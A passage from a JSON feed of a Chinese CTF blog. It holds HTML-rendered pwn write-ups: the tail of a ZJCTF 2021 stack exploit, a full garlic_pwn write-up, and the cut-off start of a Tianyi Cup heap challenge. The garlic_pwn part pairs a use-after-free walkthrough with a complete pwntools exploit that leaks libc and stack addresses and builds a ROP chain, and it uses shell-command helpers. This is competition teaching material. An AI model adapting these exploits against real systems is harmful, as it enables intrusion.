punctuation\">,</span> <span class=\"token string\">'b'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg()</span>\n\n    \n    <span class=\"token string\">''</span>\n\nattack<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p.success(getShell())</span>\np<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   zj_easy_stack.py\n@Time    :   2021/10/30 08:35:26\n@Author  :   Niyah \n'''</span>\n</code></pre>\n<h1 id=\"garlic_pwn\"><a class=\"markdownIt-Anchor\" href=\"#garlic_pwn\">#</a> garlic_pwn</h1>\n<p>这道题不知道是个什么 lib 从来没见过，这边说一下离线做题时的思路</p>\n<p>我逆向能力非常差，所以没有审给的 lib，采用类似盲做的方式</p>\n<p>本题是个 uaf 漏洞，增删改查都有，如果是正常的 libc 大概已经被打烂了。</p>\n<p>先理清程序逻辑，试一下程序的各种功能，我们先 add 几个堆块试试，可以通过指针数组查看 add 到那些内存，查看一下内存，可以发现其堆块是线性排列的，且类比 Glibc 可以发现堆块 free 之后也有着类似 fd 的结构</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030211314627.png\" alt=\"image-20211030211314627\"></p>\n<p>该 lib 里边有 free 函数，那么应该也存在着内存回收机制，我们通过 vmmap 查看一下堆的基地址，可以去查看一下堆地址最初始的地方，在这里发现了类似管理堆块的结构，其他的先不看，我们可以发现红框处地址非常可疑，并且上面也有着和 libc 相近的地址，所以不难猜到 0x80 和 0x90 处就是将要申请的堆块</p>\n<p>那么有没有一种可能，我们可以通过 uaf 申请到这块地方，之后通过部分覆盖把 libc 给带出来，而控制了这块内存，不就相当于可以任意申请了吗</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030211420388.png\" alt=\"image-20211030211420388\"></p>\n<p>经过几次尝试，我发现 0x20 大小的堆块该线性表里边太多了，我们直接申请最大的 0x500，这里边的线性表只有两个地址，那么我猜测通过申请完这两个内存之后就会申请之前 free 掉的内存</p>\n<p>实际上测试时发现再申请一个堆块，这个堆块的地址与之前两个还是不一样，而再申请的时候发现已经申请到之前申请过的堆块，如下图 1,3 处是同一块内存，那么下次申请估计就是 1 处内存 fd 指向的地址了</p>\n<p>所以我们先做出类似攻击 Tcache 的操作，在连续释放两个堆块后修改 fd 指针，至于要改到的地址，因为 uaf ，可以很轻易的泄露出来，至于要改到什么地方，直接改到堆基地址 + 0x60 的地方，填入垃圾数据后就可以泄露出 libc 地址，之后改掉 entry，得到任意申请</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030212222757.png\" alt=\"image-20211030212222757\"></p>\n<p>可以看到已经申请到堆管理块</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030213343007.png\" alt=\"image-20211030213343007\"></p>\n<p>接下来就可以申请到 environ 泄露出栈地址 ，之后一顿操作了，本题设置了沙箱，orw 操作，因为在申请时可能有对齐等等奇怪的原因，申请到栈上可能有稍微的随机，这边爆破一下</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030213845293.png\" alt=\"image-20211030213845293\"></p>\n<p>成功的打印出了本地 flag</p>\n<p><img src=\"/CTF/ZJCTF-2021-Pwn/image-20211030213929977.png\" alt=\"image-20211030213929977\"></p>\n<p>这题这样做肯定不是最优解，期待下其他师傅的 wp 了</p>\n<p>exp</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token comment\"># -*- encoding: utf-8 -*-</span>\n<span class=\"token keyword\">import</span> sys \n<span class=\"token keyword\">import</span> os \n<span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span> \n<span class=\"token comment\"># context.update( os = 'linux', arch = 'amd64',timeout = 1)</span>\nbinary <span class=\"token operator\">=</span> <span class=\"token string\">'./garlic_pwn'</span>\nos<span class=\"token punctuation\">.</span>system<span class=\"token punctuation\">(</span><span class=\"token string\">'chmod +x %s'</span><span class=\"token operator\">%</span>binary<span class=\"token punctuation\">)</span>\nelf <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\nlibc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n<span class=\"token comment\"># libc = ELF('')</span>\ncontext<span class=\"token punctuation\">.</span>binary <span class=\"token operator\">=</span> binary\nDEBUG <span class=\"token operator\">=</span> <span class=\"token number\">1</span>\n<span class=\"token keyword\">if</span> DEBUG<span class=\"token punctuation\">:</span>\n    libc <span class=\"token operator\">=</span> elf<span class=\"token punctuation\">.</span>libc\n    <span class=\"token comment\"># context.log_level = 'debug' </span>\n    p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary])</span>\n    <span class=\"token comment\"># p = process(['qemu-arm', binary,'-g','1234'])</span>\n    <span class=\"token comment\"># p = process(['qemu-aarch64','-L','','-g','1234',binary])</span>\n<span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n    host <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    port <span class=\"token operator\">=</span> <span class=\"token string\">''</span>\n    p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\nl64 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\x7f'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">6</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nl32 <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> u32<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">'\\xf7'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token operator\">-</span><span class=\"token number\">4</span><span class=\"token punctuation\">:</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsla <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nsa  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a<span class=\"token punctuation\">,</span>b        <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>b<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nlg  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> name<span class=\"token punctuation\">,</span>data  <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span>name <span class=\"token operator\">+</span> <span class=\"token string\">': 0x%x'</span> <span class=\"token operator\">%</span> data<span class=\"token punctuation\">)</span>\nse  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>send<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nrl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span>            <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\nsl  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> payload    <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>sendline<span class=\"token punctuation\">(</span>payload<span class=\"token punctuation\">)</span>\nru  <span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> a          <span class=\"token punctuation\">:</span> p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\nrint<span class=\"token operator\">=</span> <span class=\"token keyword\">lambda</span> x <span class=\"token operator\">=</span> <span class=\"token number\">12</span>     <span class=\"token punctuation\">:</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span> p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">getShell</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'exec 1>&amp;0'</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'echo shell'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'shell'</span><span class=\"token punctuation\">)</span>\n    p<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Get Shell'</span><span class=\"token punctuation\">)</span>\n    sl<span class=\"token punctuation\">(</span><span class=\"token string\">'cat flag'</span><span class=\"token punctuation\">)</span>\n    ru<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span>\n    flag <span class=\"token operator\">=</span> rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span> <span class=\"token operator\">+</span> flag<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">dbg</span><span class=\"token punctuation\">(</span> b <span class=\"token operator\">=</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>b <span class=\"token operator\">==</span> null<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">)</span>\n        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span>\n        gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span><span class=\"token string\">'b %s'</span><span class=\"token operator\">%</span>b<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">exhaust</span><span class=\"token punctuation\">(</span> pwn <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    <span class=\"token keyword\">global</span> p\n    i <span class=\"token operator\">=</span> <span class=\"token number\">0</span>\n    <span class=\"token keyword\">while</span> <span class=\"token number\">1</span> <span class=\"token punctuation\">:</span>\n        <span class=\"token keyword\">try</span><span class=\"token punctuation\">:</span>\n            i<span class=\"token operator\">+=</span><span class=\"token number\">1</span>\n            pwn<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token keyword\">except</span><span class=\"token punctuation\">:</span>\n            lg<span class=\"token punctuation\">(</span><span class=\"token string\">'times ======== > '</span><span class=\"token punctuation\">,</span>i<span class=\"token punctuation\">)</span>\n            p<span class=\"token punctuation\">.</span>close<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>DEBUG<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span>binary<span class=\"token punctuation\">)</span>\n            <span class=\"token keyword\">else</span> <span class=\"token punctuation\">:</span>\n                p <span class=\"token operator\">=</span> remote<span class=\"token punctuation\">(</span>host<span class=\"token punctuation\">,</span>port<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">one_gadget</span><span class=\"token punctuation\">(</span>filename<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    log<span class=\"token punctuation\">.</span>success<span class=\"token punctuation\">(</span><span class=\"token string\">'Leak One_Gadgets...'</span><span class=\"token punctuation\">)</span>\n    one_ggs <span class=\"token operator\">=</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>subprocess<span class=\"token punctuation\">.</span>check_output<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span><span class=\"token string\">'one_gadget'</span><span class=\"token punctuation\">,</span><span class=\"token string\">'--raw'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-f'</span><span class=\"token punctuation\">,</span>filename<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token string\">' '</span><span class=\"token punctuation\">)</span>\n    <span class=\"token keyword\">return</span> <span class=\"token builtin\">list</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">map</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span>one_ggs<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> content <span class=\"token operator\">=</span> <span class=\"token string\">'a'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">' size:'</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">' Content:'</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">delete</span><span class=\"token punctuation\">(</span> idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx:'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span> idx <span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx:'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">edit</span><span class=\"token punctuation\">(</span> idx <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'idx:'</span> <span class=\"token punctuation\">,</span> idx<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">' Content:'</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token comment\"># one_gad = one_gadget(libc.path)</span>\n<span class=\"token comment\"># ptr_lits = $rebase(0x4040)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    \n    ptr_lits <span class=\"token operator\">=</span> <span class=\"token number\">0x4040</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    rl<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    leak <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recv<span class=\"token punctuation\">(</span><span class=\"token number\">6</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span> <span class=\"token number\">8</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x61</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x1100</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'leak'</span><span class=\"token punctuation\">,</span>leak<span class=\"token punctuation\">)</span>\n\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n    delete<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">1</span> <span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>leak <span class=\"token operator\">+</span> <span class=\"token number\">0x60</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x500</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x300</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#2</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#3</span>\n\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> <span class=\"token string\">'a'</span><span class=\"token operator\">*</span><span class=\"token number\">0x8</span><span class=\"token punctuation\">)</span> <span class=\"token comment\">#4</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span>\n\n    libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x3f8c0</span>\n    lg<span class=\"token punctuation\">(</span><span class=\"token string\">'libc.address'</span> <span class=\"token punctuation\">,</span> libc<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n    system_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span>\n    __free_hook <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">]</span>\n    environ <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'__environ'</span><span class=\"token punctuation\">]</span>\n    binsh_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span><span class=\"token string\">'/bin/sh'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n\n\n    fake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">-</span> <span class=\"token number\">0x3f8c0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000002f00030d00</span><span class=\"token punctuation\">,</span>\n        environ \n    <span class=\"token punctuation\">)</span>\n    \n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span> fake<span class=\"token punctuation\">)</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span><span class=\"token punctuation\">)</span>\n    show<span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">)</span>\n    stack_addr <span class=\"token operator\">=</span> l64<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x119</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x48</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x68</span>\n\n    read_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'read'</span><span class=\"token punctuation\">]</span>\n    open_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'open'</span><span class=\"token punctuation\">]</span>\n    puts_addr <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span>\n    ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">' ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rax_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rax; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rsi_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rsi; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    pop_rdx_pop_rbx_ret <span class=\"token operator\">=</span> libc<span class=\"token punctuation\">.</span>search<span class=\"token punctuation\">(</span>asm<span class=\"token punctuation\">(</span><span class=\"token string\">'pop rdx ; pop rbx ; ret'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">next</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    \n    flag_addr <span class=\"token operator\">=</span> stack_addr <span class=\"token operator\">+</span> <span class=\"token number\">0x100</span>\n    chain <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> open_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">3</span> <span class=\"token punctuation\">,</span> pop_rsi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> pop_rdx_pop_rbx_ret <span class=\"token punctuation\">,</span> <span class=\"token number\">0x100</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> read_addr<span class=\"token punctuation\">,</span>\n        pop_rdi_ret <span class=\"token punctuation\">,</span> flag_addr <span class=\"token punctuation\">,</span> puts_addr\n    <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">0x100</span><span class=\"token punctuation\">,</span><span class=\"token string\">'\\x00'</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span> <span class=\"token string\">'flag\\x00'</span>\n    <span class=\"token comment\"># len chain 0x80</span>\n\n    fake <span class=\"token operator\">=</span> flat<span class=\"token punctuation\">(</span>\n        <span class=\"token number\">0x10</span> <span class=\"token punctuation\">,</span> libc<span class=\"token punctuation\">.</span>address <span class=\"token operator\">-</span> <span class=\"token number\">0x3f8c0</span><span class=\"token punctuation\">,</span>\n        <span class=\"token number\">0</span> <span class=\"token punctuation\">,</span> <span class=\"token number\">0x0000002f00030d00</span><span class=\"token punctuation\">,</span>\n        stack_addr\n    <span class=\"token punctuation\">)</span>\n    edit<span class=\"token punctuation\">(</span><span class=\"token number\">4</span> <span class=\"token punctuation\">,</span> fake<span class=\"token punctuation\">)</span>\n\n    <span class=\"token comment\"># dbg('*$rebase(0x00000000000160C)')</span>\n    add<span class=\"token punctuation\">(</span><span class=\"token number\">0x500</span> <span class=\"token punctuation\">,</span> chain <span class=\"token punctuation\">)</span>\n    \n\n    p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n    <span class=\"token string\">''</span>\n\n<span class=\"token comment\"># attack()</span>\nexhaust<span class=\"token punctuation\">(</span>attack<span class=\"token punctuation\">)</span>\n<span class=\"token comment\"># p.success(getShell())</span>\n\n<span class=\"token triple-quoted-string string\">'''\n@File    :   garlic_pwn.py\n@Time    :   2021/10/30 13:27:00\n@Author  :   Niyah \n'''</span></code></pre>\n<p>ps：不知道为啥，感觉现在做题越来越累了，最后也没能拿到一个好的名次，要是调试 pwn2 的时间少一些可能当时就做出 pwn3 了吧</p>\n",
            "tags": [
                "PWN",
                "堆",
                "栈",
                "UAF"
            ]
        },
        {
            "id": "http://niyah.cn/CTF/%E5%A4%A9%E7%BF%BC+%E9%95%BF%E5%AE%89+Das/",
            "url": "http://niyah.cn/CTF/%E5%A4%A9%E7%BF%BC+%E9%95%BF%E5%AE%89+Das/",
            "title": "天翼+长安+Das",
            "date_published": "2021-09-25T14:06:22.000Z",
            "content_html": "<p>自身逆向能力还是太差了</p>\n<a id=\"more\"></a>\n<h1 id=\"天翼杯-chaos\"><a class=\"markdownIt-Anchor\" href=\"#天翼杯-chaos\">#</a> 天翼杯 - chaos</h1>\n<p>这题确实是有点素质，再加上还得上课，逆得我头昏眼花</p>\n<p>2.27 下的堆溢出题目</p>\n<p>首先是对程序输入的逆向，本题目对用户命令输入有些要求，经过长时间的逆向分析得到了如下指令输入格式，分别对应了增查改删</p>\n<pre class=\"language-python\" data-language=\"python\"><code class=\"language-python\"><span class=\"token keyword\">def</span> <span class=\"token function\">cmd</span><span class=\"token punctuation\">(</span>num<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>>'</span><span class=\"token punctuation\">,</span>num<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>size <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>\n    cmd<span class=\"token punctuation\">(</span><span class=\"token string\">'passwd:Cr4at3 \\nopcode:1\\n'</span><span class=\"token punctuation\">)</span>\n    sla<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">)</span>\n    sa<span class=\"token punctuation\">(</span><span class=\"token string\">'>>> '</span> <span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span>\n\n<span class=\"token keyword\">def</span> <span class=\"token function\">show</span><span class=\"token punctuation\">(</span>idx<span class=\"token punctuation\">)</span><span 